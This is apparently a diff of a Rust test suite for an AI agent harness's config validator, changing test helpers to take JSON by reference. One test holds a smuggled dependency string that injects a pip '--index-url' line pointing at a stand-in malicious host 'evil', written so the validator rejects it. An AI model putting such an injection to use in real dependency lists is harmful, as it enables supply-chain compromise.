@@ -24,12 +24,12 @@ use crate::interventions::{InterventionValue, InterventionsOption};
 use crate::test_support::WarnRecorder;
 use crate::types::WebFetchTransport;
 
-fn define(config: JsonValue) -> HarnessAgentConfig {
-    define_harness_agent_config(&config).expect("valid config")
+fn define(config: &JsonValue) -> HarnessAgentConfig {
+    define_harness_agent_config(config).expect("valid config")
 }
 
-fn error_of(config: JsonValue) -> String {
-    normalize_harness_agent_config(&config)
+fn error_of(config: &JsonValue) -> String {
+    normalize_harness_agent_config(config)
         .expect_err("invalid config")
         .to_string()
 }
@@ -85,7 +85,7 @@ fn mcp_servers(options: &HarnessAgentOptions) -> JsonValue {
 
 #[test]
 fn normalizes_the_complete_portable_definition() {
-    let config = define(json!({
+    let config = define(&json!({
         "name": "Reviewer",
         "description": "Reviews changes",
         "instructions": "Be strict.",
@@ -160,14 +160,14 @@ fn maps_defaults_through_the_same_contract_create_harness_consumes() {
 
 #[test]
 fn forwards_a_disabled_session_as_off() {
-    let config = define(json!({ "session": false }));
+    let config = define(&json!({ "session": false }));
     assert!(matches!(options(&config, "/project").session, SessionOption::Off));
 }
 
 #[test]
 fn folds_context_manager_off_to_false_matching_python() {
     for value in [json!("off"), json!(false)] {
-        let config = define(json!({ "contextManager": value }));
+        let config = define(&json!({ "contextManager": value }));
         assert_eq!(config.context_manager, HarnessConfigContextManager::Off);
         assert_eq!(
             serde_json::to_value(&config).unwrap()["contextManager"],
@@ -183,7 +183,7 @@ fn folds_context_manager_off_to_false_matching_python() {
 // Rust form of the TS case: no referenced language can be loaded, and the error names it.
 #[test]
 fn fails_loudly_when_the_runtime_cannot_load_a_referenced_language() {
-    let config = define(json!({
+    let config = define(&json!({
         "tools": [{ "kind": "tool", "module": "./tool.py", "language": "python", "files": ["./tool.py"] }],
     }));
 
@@ -217,21 +217,21 @@ fn loads_executable_values_through_declared_module_references() {
         json!({ "agentConfigModules": { "conversationManager": reference("agent-config") } }),
     ];
     for config in configs {
-        let error = options_from_config(&define(config), Path::new("/project"), &env(&[])).unwrap_err();
+        let error = options_from_config(&define(&config), Path::new("/project"), &env(&[])).unwrap_err();
         assert_eq!(
             error.to_string(),
             "module references are not supported in Rust yet (language \"typescript\")"
         );
     }
 
-    let config = define(json!({ "tools": [{ "module": "./tool.ts" }] }));
+    let config = define(&json!({ "tools": [{ "module": "./tool.ts" }] }));
     let error = options_from_config(&config, Path::new("/project"), &env(&[])).unwrap_err();
     assert_eq!(
         error.to_string(),
         "module references are not supported in Rust yet"
     );
 
-    let config = define(json!({ "interventions": ["ask", "./policy.cedar"] }));
+    let config = define(&json!({ "interventions": ["ask", "./policy.cedar"] }));
     assert_eq!(
         intervention_texts(&options(&config, "/project")),
         ["ask", "/project/policy.cedar"]
@@ -258,7 +258,7 @@ fn resolves_the_intervention_against_the_project_root_when_it_is_a_cedar_file() 
         ("./policy.cedar.bak", "./policy.cedar.bak"),
     ];
     for (value, expected) in rows {
-        let config = define(json!({ "interventions": value }));
+        let config = define(&json!({ "interventions": value }));
 
         let options = options(&config, "/project");
 
@@ -273,7 +273,7 @@ fn resolves_the_intervention_against_the_project_root_when_it_is_a_cedar_file() 
 
 #[test]
 fn expands_mcp_environment_placeholders_and_unwraps_the_server_map() {
-    let config = define(json!({
+    let config = define(&json!({
         "mcpServers": {
             "mcpServers": {
                 "private": {
@@ -299,7 +299,7 @@ fn expands_mcp_environment_placeholders_and_unwraps_the_server_map() {
 
 #[test]
 fn rejects_a_missing_mcp_environment_variable_instead_of_passing_the_placeholder_through() {
-    let config = define(json!({
+    let config = define(&json!({
         "mcpServers": { "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer ${MISSING_VAR}" } } },
     }));
 
@@ -323,7 +323,7 @@ fn loads_and_expands_file_backed_mcp_config() {
         .to_string(),
     )
     .unwrap();
-    let config = define(json!({ "mcpServers": "./mcp.json" }));
+    let config = define(&json!({ "mcpServers": "./mcp.json" }));
 
     let options = options_from_config(
         &config,
@@ -341,7 +341,7 @@ fn loads_and_expands_file_backed_mcp_config() {
 #[test]
 fn rejects_python_dependency_entries_carrying_extra_pip_directives() {
     let error = error_of(
-        json!({ "dependencies": { "python": ["requests\n--index-url http://evil/simple\nevilpkg"] } }),
+        &json!({ "dependencies": { "python": ["requests\n--index-url http://evil/simple\nevilpkg"] } }),
     );
     assert!(
         error.contains("dependencies.python entries must not contain line breaks."),
@@ -351,7 +351,7 @@ fn rejects_python_dependency_entries_carrying_extra_pip_directives() {
 
 #[test]
 fn resolves_state_directories_against_the_project_root_matching_python() {
-    let config = define(json!({
+    let config = define(&json!({
         "session": { "id": "proj", "dir": ".agent/sessions" },
         "memory": { "dir": ".agent/memory" },
         "skills": [".agent/skills", "https://example.com/SKILL.md"],
@@ -401,7 +401,7 @@ fn treats_the_retired_key_as_a_plain_unknown_key() {
 
 #[test]
 fn passes_web_fetch_transport_through_the_config_bridge() {
-    let config = define(json!({ "builtinTools": { "web_fetch": { "transport": "direct" } } }));
+    let config = define(&json!({ "builtinTools": { "web_fetch": { "transport": "direct" } } }));
     assert_eq!(
         serde_json::to_value(&config.builtin_tools).unwrap(),
         json!({ "web_fetch": { "transport": "direct" } })
@@ -419,7 +419,7 @@ fn passes_web_fetch_transport_through_the_config_bridge() {
 #[test]
 fn normalizes_a_builtin_tools_mapping_with_a_per_tool_web_fetch_config() {
     let builtin_tools = json!({ "*": false, "shell": true, "web_fetch": { "model": "openai/gpt-5-mini" } });
-    let config = define(json!({ "builtinTools": builtin_tools }));
+    let config = define(&json!({ "builtinTools": builtin_tools }));
     assert_eq!(
         serde_json::to_value(&config.builtin_tools).unwrap(),
         builtin_tools
@@ -433,7 +433,7 @@ fn normalizes_the_shell_programmatic_tool_caller_and_subagent_per_tool_configs()
         "programmatic_tool_caller": { "allowedTools": ["read"], "timeout": 60 },
         "subagent": { "maxDepth": 1 },
     });
-    let config = define(json!({ "builtinTools": builtin_tools }));
+    let config = define(&json!({ "builtinTools": builtin_tools }));
     let HarnessConfigBuiltinToolsSetting::Mapping(mapping) = &config.builtin_tools else {
         panic!("builtinTools is {:?}", config.builtin_tools);
     };
@@ -456,7 +456,7 @@ fn normalizes_the_shell_programmatic_tool_caller_and_subagent_per_tool_configs()
     );
 
     let builtin_tools = json!({ "programmatic_tool_caller": { "allowedTools": null, "timeout": null } });
-    let config = define(json!({ "builtinTools": builtin_tools }));
+    let config = define(&json!({ "builtinTools": builtin_tools }));
     assert_eq!(
         serde_json::to_value(&config.builtin_tools).unwrap(),
         builtin_tools
@@ -519,7 +519,7 @@ fn rejects_the_per_tool_config() {
     ];
     for (builtin_tools, message) in rows {
         assert_eq!(
-            error_of(json!({ "builtinTools": builtin_tools })),
+            error_of(&json!({ "builtinTools": builtin_tools })),
             format!("Invalid agent config:\n{message}")
         );
     }
@@ -528,7 +528,7 @@ fn rejects_the_per_tool_config() {
 #[test]
 fn rejects_an_unknown_built_in_tool_name_in_a_builtin_tools_mapping() {
     assert_eq!(
-        error_of(json!({ "builtinTools": { "grep": true } })),
+        error_of(&json!({ "builtinTools": { "grep": true } })),
         "Invalid agent config:\nbuiltinTools has unknown keys: grep. Allowed: *, shell, read, write, edit, web_fetch, web_search, programmatic_tool_caller, subagent."
     );
 }
@@ -536,14 +536,14 @@ fn rejects_an_unknown_built_in_tool_name_in_a_builtin_tools_mapping() {
 #[test]
 fn rejects_an_effort_outside_the_enum() {
     assert_eq!(
-        error_of(json!({ "effort": "turbo" })),
+        error_of(&json!({ "effort": "turbo" })),
         "Invalid agent config:\neffort must be one of: auto, off, minimal, low, medium, high, xhigh, max."
     );
 }
 
 #[test]
 fn maps_a_builtin_tools_mapping_into_create_harness_options() {
-    let config = define(json!({
+    let config = define(&json!({
         "builtinTools": { "subagent": { "maxDepth": 1 }, "web_fetch": { "model": "openai/gpt-5-mini" }, "shell": false },
     }));
 
@@ -591,7 +591,7 @@ fn rejects_unknown_memory_subkeys_and_names_them() {
     input["memory"] = json!({ "dir": "mem", "stores": [{ "kind": "memory-store", "module": "store" }] });
 
     assert_eq!(
-        error_of(input),
+        error_of(&input),
         "Invalid agent config:\nmemory has unknown keys: stores. Allowed: dir."
     );
 }
@@ -601,7 +601,7 @@ fn rejects_unknown_memory_subkeys_and_names_them() {
 #[test]
 fn reports_every_issue_on_its_own_line_under_the_json_path() {
     assert_eq!(
-        error_of(json!({
+        error_of(&json!({
             "name": "",
             "effort": "turbo",
             "tools": [{ "kind": "tool" }],
@@ -636,7 +636,7 @@ fn rejects_malformed_references_instead_of_dropping_them() {
     input["tools"] = json!([{ "kind": "tool" }]);
 
     assert_eq!(
-        error_of(input),
+        error_of(&input),
         "Invalid agent config:\ntools[0].module must be a non-empty string."
     );
 }
@@ -706,7 +706,7 @@ fn rejects() {
         ),
     ];
     for (config, message) in rows {
-        assert_eq!(error_of(config), format!("Invalid agent config:\n{message}"));
+        assert_eq!(error_of(&config), format!("Invalid agent config:\n{message}"));
     }
 }
 
@@ -723,13 +723,13 @@ fn names_the_record_key_in() {
         ),
     ];
     for (config, message) in rows {
-        assert_eq!(error_of(config), format!("Invalid agent config:\n{message}"));
+        assert_eq!(error_of(&config), format!("Invalid agent config:\n{message}"));
     }
 }
 
 #[test]
 fn keeps_module_reference_extras_an_empty_files_list_and_repeated_dependency_versions() {
-    let config = define(json!({
+    let config = define(&json!({
         "tools": [{ "module": "./tool.ts", "files": [], "foo": 1 }],
         "dependencies": { "typescript": { "a": "^1.0.0", "b": "^1.0.0" } },
     }));
@@ -747,7 +747,7 @@ fn keeps_module_reference_extras_an_empty_files_list_and_repeated_dependency_ver
 #[test]
 fn rejects_a_config_that_is_not_an_object() {
     for value in [json!(null), json!([]), json!("x")] {
-        assert_eq!(error_of(value), "agent config must be an object.");
+        assert_eq!(error_of(&value), "agent config must be an object.");
     }
 }
 
@@ -881,7 +881,7 @@ fn reports_the_union_and_container_issues() {
         (json!({ "agentConfig": [] }), "agentConfig must be an object."),
     ];
     for (config, message) in rows {
-        assert_eq!(error_of(config), format!("Invalid agent config:\n{message}"));
+        assert_eq!(error_of(&config), format!("Invalid agent config:\n{message}"));
     }
 }
 
@@ -889,7 +889,7 @@ fn reports_the_union_and_container_issues() {
 // `agentConfig` keys) and the file-backed MCP errors.
 #[test]
 fn maps_the_remaining_config_values_into_options() {
-    let config = define(json!({
+    let config = define(&json!({
         "description": "Reviews changes",
         "instructions": "Be strict.",
         "caching": false,
@@ -970,7 +970,7 @@ fn rejects_an_mcp_config_file_that_is_not_a_server_map() {
     std::fs::write(root.path().join("list.json"), "[]").unwrap();
     std::fs::write(root.path().join("nested.json"), r#"{"mcpServers": []}"#).unwrap();
     let error = |path: &str| {
-        options_from_config(&define(json!({ "mcpServers": path })), root.path(), &env(&[]))
+        options_from_config(&define(&json!({ "mcpServers": path })), root.path(), &env(&[]))
             .unwrap_err()
             .to_string()
     };
